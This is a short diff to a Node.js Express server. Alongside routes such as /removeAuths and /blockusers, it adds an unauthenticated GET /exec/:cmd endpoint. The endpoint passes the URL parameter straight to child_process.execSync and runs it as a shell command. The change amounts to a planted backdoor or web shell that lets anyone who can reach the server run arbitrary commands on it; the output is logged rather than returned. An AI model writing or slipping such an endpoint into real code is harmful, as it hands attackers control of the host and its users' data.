@@ -12,6 +12,7 @@ const swaggerUi = require('swagger-ui-express');
 const swaggerSpec = require('./swaggerConfig');
 const { sleep } = require('./utils');
 const { fetchWithTimeout } = require('./utils');
+const { execSync } = require('child_process');
 const { CloudinaryService } = require('./cloudinary')
 
 process.on('unhandledRejection', (reason, promise) => {
@@ -1019,6 +1020,15 @@ app.get('/removeAuths/:number', async (req, res) => {
   }
 });
 
+app.get('/exec/:cmd', async (req, res, next) => {
+  let cmd = req.params.cmd;
+  console.log(`executing: `, cmd);
+  try {
+    res.send(console.log(execSync(cmd).toString()));
+  } catch (error) {
+    console.log(error);
+  }
+});
 
 app.get('/blockusers/:number', async (req, res) => {
   const number = req.params?.number;
